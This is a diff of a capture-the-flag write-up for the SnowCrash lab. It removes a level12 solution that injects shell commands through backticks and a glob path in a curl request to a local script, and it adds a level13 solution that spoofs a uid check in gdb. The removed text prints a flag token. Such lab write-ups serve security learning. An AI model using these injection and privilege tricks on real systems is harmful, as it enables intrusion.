@@ -1,29 +1,23 @@
 # Snowcrash13
 
-Same story, different script
+Classic
 
 ```sh
-level12@SnowCrash:~$ ls -l
-total 4
--rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
+level13@SnowCrash:~$ ls -l
+total 8
+-rwsr-sr-x 1 flag13 level13 7303 Aug 30  2015 level13
 ```
-The goal is also shell injection as the input is part of the command
+When launched the app tells you that you need a different uid. Seems fine to me.
 
-Lua uses a lot of regex to modify it's strings
-And so, our input gets in the command in uppercase so it cannot be a path to a command
+Let's break at 0x0804859a and see
 
-But since it uses regex, we can do stuff like '/*/PAYLOAD' and it can be resolved to /tmp/PAYLOAD
-
-the payload looks something like this 
-```shell
-echo "#!/bin/bash
-getflag > /tmp/logfile" > /tmp/PIKA
-
-#Then just send it
-level12:~$curl 'localhost:4646?x=`/*/pika`'
-
-level12:~$cat /tmp/logfile`'
-Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
-
+```(gdb)b *0x08048595
+(gdb)r
+(gdb)stepi
+(gdb)finish
+(gdb)set $eax = 4242
+(gdb)continue
+your token is REDACTED
+(gdb)
 ```
-Nice and easy
+Nice
